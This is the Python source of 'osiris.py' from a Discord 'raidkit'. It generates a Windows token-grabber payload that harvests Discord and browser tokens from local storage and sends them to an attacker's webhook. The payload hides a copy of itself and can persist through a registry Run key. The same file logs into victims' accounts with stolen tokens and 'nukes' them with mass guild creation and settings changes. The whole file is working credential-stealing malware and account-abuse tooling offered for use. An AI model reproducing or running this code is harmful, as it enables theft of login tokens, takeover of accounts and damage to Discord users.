'''
Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
Copyright © 2022 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

osiris.py stores the Osiris program for Discord Raidkit.
osiris.py was last updated on 11/08/22 at 13:36.
'''

import logging
import os

import requests
from display import show_osiris_screen
from selenium import webdriver
from selenium.common.exceptions import WebDriverException

logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                    filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')


class Osiris:
    def __init__(self, theme: str) -> None:
        self.theme = theme
        self.auth = ''
        self.hint = ''
        self.guild_IDs = []
        return

    def run(self) -> bool:
        temp = ''
        while temp != '5':
            show_osiris_screen(self.theme, self.hint)
            temp = input()
            if temp == '1':
                self.hint = self.generate_grabber()
            elif temp == '2':
                print('Enter a user authentication token: ', end='')
                self.auth = input()
                self.hint = self.get_account_info()
            elif temp == '3':
                print('Enter a user authentication token: ', end='')
                self.auth = input()
                self.hint = self.login()
            elif temp == '4':
                print('Enter a user authentication token: ', end='')
                self.auth = input()
                self.hint = self.nuke_account()
        return True

    def generate_grabber(self) -> str:

        def get_generate_code(webhook, folder, hpayload, do_reg_key) -> str:
            """Get code to generate token grabber payload.

            Returns:
                str: code to generate token grabber payload.

            Credits:
            - wodxgod: created logic to grab discord tokens
            - Microsoft: lets me write to registry keys without administrator
            """

            code = r'''
import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "''' + webhook + r'''"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = "@everyone"
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    payload = json.dumps({"content": message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{folder}''' + r'''"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "''' + hpayload + r'''.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    '''
            if do_reg_key:
                code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
    '''
            code += r'''main()
'''
            return code

        def write_payload(payload, rpayload) -> None:
            """Writes the token grabber payload file
            """
            if not os.path.isdir("payloads"):
                os.mkdir("payloads")

            with open(f"payloads/{rpayload}.pyw", "w") as f:
                f.write(payload)

            return

        try:
            webhook = input('Please enter a discord webhook: ')
            folder = input(
                'Please enter a folder name (this folder will be created on the target\'s computer, containing another payload): ')
            rpayload = input(
                'Please enter the regular payload name (this is the payload the target will knowingly run): ')
            hpayload = input(
                'Please enter the hidden payload name (this is the payload the target will unknowingly run if registry key is enabled): ')
            do_reg_keg = input(
                'Enter 1 to enable registry keys (will let the payload run every time the target logs into Windows): ')

            if do_reg_keg == '1':
                do_reg_keg = True
            else:
                do_reg_keg = False

            try:
                os.mkdir(folder)
                os.rmdir(folder)
                open(rpayload + ".txt", "w").close()
                os.remove(rpayload + ".txt")
                open(hpayload + ".txt", "w").close()
                os.remove(hpayload + ".txt")
            except:
                return 'Some options entered had invalid Windows names!'

            code = get_generate_code(webhook, folder, hpayload, do_reg_keg)
            write_payload(code, rpayload)
            return 'Successfully generated payload!'

        except Exception as e:
            logging.error(f'Error in osiris.py - generate_grabber(): {e}')
            return f'Error in osiris.py - generate_grabber(): {e}'

    def get_account_info(self) -> tuple:
        b, r = self.check_auth()
        if b:
            userName = f'{r[1].json()["username"]}#{r[1].json()["discriminator"]}'
            userID = r[1].json()["id"]
            phone = r[1].json()["phone"]
            email = r[1].json()["email"]
            mfa = r[1].json()["mfa_enabled"]
            return f'''[User ID]\t\t{userID}
[User Name]\t\t{userName}
[2 Factor]\t\t{mfa}
[Email]\t\t\t{email}
[Phone number]\t\t{phone if phone else ''}
[Token]\t\t\t{self.auth}'''
        else:
            return 'User authentication token is not valid!'

    def check_auth(self) -> tuple:
        headers = {"Authorization": self.auth,
                   "Content-Type": "application/json"}

        r = requests.get(
            'https://discord.com/api/v6/users/@me', headers=headers)

        if r.status_code == 200:
            return True, r
        return False, False

    def login(self) -> str:
        try:
            if self.check_auth():
                webdriver.ChromeOptions.binary_location = os.path.join(
                    'browser', 'chrome.exe')
                opts = webdriver.ChromeOptions()
                opts.add_experimental_option('detach', True)
                driver = webdriver.Chrome(
                    executable_path=os.path.join('browser', 'chromedriver.exe'), options=opts)
                script = """
                            function login(token) {
                            setInterval(() => {
                            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                            }, 50);
                            setTimeout(() => {
                            location.reload();
                            }, 2500);
                            }
                            """
                driver.get('https://discord.com/login')
                driver.execute_script(script + f'\nlogin("{self.auth}")')
                return 'Logged into user account successfully'
            else:
                return 'User authentication token is not valid!'
        except WebDriverException as e:
            return f"Osiris's browser folder was not found. {e}"
        except Exception as e:
            logging.error(f'Error in osiris.py - login(): {e}')
            return f'Error in osiris.py - login(): {e}'

    def nuke_account(self) -> str:

        def nuke_requests(headers) -> None:
            headers = headers

            for i in range(200):
                try:
                    payload = {
                        "name": "Hacked by the-cult-of-integral's Discord Raidkit!",
                        "region": "europe",
                        "icon": None,
                        "channels": None
                    }
                    requests.post(
                        "https://discord.com/api/v6/guilds",
                        headers=headers,
                        json=payload
                    )
                except:
                    pass

            settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }

            requests.patch(
                "https://discord.com/api/v8/users/@me/settings",
                headers=headers,
                json=settings
            )
            return

        try:
            if self.check_auth()[0]:
                print('\nNuking account... this may take a while...')

                # Attempt to get IDs of guilds from settings response (used to make account leave every guild, usually fails thanks to nerf).

                headers = {
                    "Authorization": self.auth,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }

                url = "https://discord.com/api/v8/users/@me/settings"
                r = requests.get(url, headers=headers)
                self.guild_IDs = r.json()['guild_positions']
                nuke_requests(headers)
                return 'User nuked successfully'
            else:
                return 'User authentication token is not valid!'
        except Exception as e:
            logging.error(f'Error in osiris.py - nuke_account(): {e}')
            return f'Error in osiris.py - nuke_account(): {e}'
